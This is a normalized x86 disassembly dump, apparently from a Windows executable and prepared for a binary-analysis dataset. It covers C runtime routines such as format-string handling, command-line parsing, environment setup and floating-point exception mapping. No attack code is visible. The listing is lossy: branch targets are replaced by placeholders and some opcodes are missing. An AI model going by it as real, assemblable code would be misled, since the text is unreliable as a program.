jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_4099f4
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
jne r-xdata
mov edx [ ebp + 0x10 ]
push esi
test edx edx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_40c5f0
add esp 0xc
jmp r-xdata
mov eax edx
dec edx
test eax eax
pop esi
je r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop ebp
retn
mov eax [ ebp + 0x8 ]
lea ecx [ edx + 0x1 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
inc edi
inc ecx
test al al
je r-xdata
inc edi
inc ecx
test edx edx
je r-xdata
test edx edx
jne r-xdata
and [ edi - 0x1 ] 0x0
jmp r-xdata
mov al [ ecx ]
dec edx
mov [ edi ] al
inc edi
inc ecx
test al al
je r-xdata
mov al [ ecx ]
dec edx
movzx esi al
test [ esi + rw-data ] 0x4
mov [ edi ] al
je r-xdata
jmp r-xdata
and [ edi - 0x2 ] 0x0
jmp r-xdata
sub_409a7e
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_40a19f ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a25d
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a25d
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40a1bf
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40a1bf
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a26a
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a25d
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a25d
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_40a25d
pop ecx
xor edx edx
call sub_40a25d
pop ecx
jmp r-xdata
call sub_40a25d
pop ecx
movzx eax ax
jmp r-xdata
call sub_40a25d
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_407ea0
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_40a25d
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_40a27a
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_40c6ee
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40a25d
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_40c7d0
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_40c760
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_40a225
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40a1f4
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_40a225
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_40a1f4
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40a1f4
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_40a225
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_40c6ee
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_40a1bf
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_409052
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_40a1f4
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_40a1bf
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_40a225
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_40a1bf
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40a288
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x76c
cmp ebx 0x46
jl r-xdata
or eax 0xffffffff
cmp ebx 0x8a
jg r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ edi * 4 + rw-data ]
add esi [ ebp + 0x10 ]
test bl 0x3
jne r-xdata
call sub_40c845
mov eax ebx
lea ecx [ ebx - 0x1 ]
imul eax eax 0x16d
sar ecx 0x2
mov edx esi
mov [ ebp - 0x8 ] esi
add edx ecx
mov [ ebp - 0x10 ] ebx
add eax edx
mov edx [ ebp + 0x1c ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
lea ecx [ eax + ecx * 8 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x18 ]
imul ecx ecx 0x3c
add ecx [ rw-data ]
dec edi
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x14 ] edi
pop edi
pop esi
lea ecx [ ecx + edx + 0x7c558180 ]
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp edi 0x2
jle r-xdata
add ecx [ rw-data ]
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
inc esi
pop ebx
leave
retn
mov eax ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40cab8
pop ecx
mov ecx [ ebp + 0x8 ]
test eax eax
je r-xdata
sub_40a34a
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_40bf72
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_408ba8
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_40a3d7
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
mov eax [ esp + 0xc ]
test [ eax + 0xd ] 0x10
je r-xdata
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
pop esi
retn
push eax
call sub_408f80
pop ecx
push esi
call sub_408f80
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
pop esi
retn
sub_40a414
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40cda4
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40cda4
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor edx edx
mov ecx rw-data
push 0x1a
call sub_407d25
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40a4cd
push ebp
mov ebp esp
push ebx
push [ ebp + 0x8 ]
call sub_40a60e
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop ebx
pop ebp
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov ecx [ rw-data ]
mov edx [ rw-data ]
add edx ecx
push esi
cmp ecx edx
jge r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
cmp eax 0xc000008e
jne r-xdata
lea esi [ ecx + ecx * 2 ]
sub edx ecx
lea esi [ esi * 4 + rw-data ]
cmp eax 0xc0000090
jne r-xdata
mov [ rw-data ] 0x83
jmp r-xdata
and [ esi ] 0x0
add esi 0xc
dec edx
jne r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rw-data ] 0x81
jmp r-xdata
push [ rw-data ]
push 0x8
call ebx
pop ecx
mov [ rw-data ] esi
pop ecx
pop esi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ rw-data ] 0x84
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ rw-data ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rw-data ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rw-data ] 0x86
jmp r-xdata
mov [ rw-data ] 0x8a
sub_40a60e
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40a651
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_4099d8
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_408ba8
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_407d25
pop ecx
push esi
call sub_407ea0
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_407d6e
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_408ba8
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_407ea0
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_40ba20
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_407d25
pop ecx
sub_40a70a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_4099d8
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_40a7a3
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_408ba8
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_40a7a3
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_407d25
pop ecx
sub_40a7a3
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_40a957
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_408ba8
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_408ba8
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_407f80
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
